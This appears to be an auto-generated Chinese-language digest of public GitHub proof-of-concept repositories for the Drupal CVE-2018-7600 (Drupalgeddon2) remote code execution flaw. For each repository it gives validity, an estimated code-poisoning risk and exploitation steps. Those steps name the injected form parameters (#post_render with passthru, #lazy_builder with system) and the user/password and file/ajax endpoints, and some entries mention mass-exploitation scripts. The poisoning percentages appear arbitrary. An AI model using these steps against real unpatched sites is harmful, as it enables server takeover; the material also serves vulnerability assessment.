
**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
